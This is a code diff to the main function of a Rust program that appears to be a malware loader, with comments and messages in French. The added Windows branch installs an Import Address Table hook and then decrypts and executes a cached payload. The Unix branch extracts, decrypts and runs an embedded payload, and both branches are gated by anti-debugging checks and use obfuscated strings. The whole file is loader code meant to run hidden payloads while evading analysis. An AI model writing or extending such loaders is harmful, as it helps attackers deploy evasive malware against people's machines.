@@ -10,18 +10,42 @@ mod loader;
 mod utils;
 mod cypher;
 
+#[link(name = "kernel32")]
+extern "system" {
+    fn Beep(dwFreq: u32, dwDuration: u32) -> i32;
+}
+
 fn main() {
-    // Enti-Debug
     let corrupted_mode = anti_debug::run_all_checks();
-    //let corrupted_mode = false;
-    // Extraction & Déchiffrement
-    if let Some(decrypted_payload) = payload::extract_and_decrypt(corrupted_mode) {
-        // Exécution
-        loader::execute(decrypted_payload);
-    } else {
-        println!("{}", obfstr!("[-] Payload introuvable !"));
-        let mut s = String::new();
-        std::io::stdin().read_line(&mut s).unwrap();
-        std::process::exit(0);
+	//let corrupted_mode = false;
+    #[cfg(windows)]
+    {
+		unsafe {
+			let hook = loader::windows::iat::swap_iat();
+			if hook {
+				println!("Hook IAT installé avec succès !");
+				loader::windows::iat::CORRUPTED_FLAG = corrupted_mode;
+				Beep(440, 500);
+				if let Some(payload) = payload::DECRYPTED_CACHE.take() {
+					loader::execute(payload);
+				} else {
+					println!("[-] Payload introuvable !");
+				}
+			}
+			else {
+				println!("echec du hook");
+			}
+		}
     }
+
+    #[cfg(unix)]
+    {
+       if let Some(decrypted_payload) = payload::extract_and_decrypt(corrupted_mode) {
+			loader::execute(decrypted_payload);
+		} else {
+			println!("[-] Payload introuvable !");
+		}
+    }
+
+    
 }
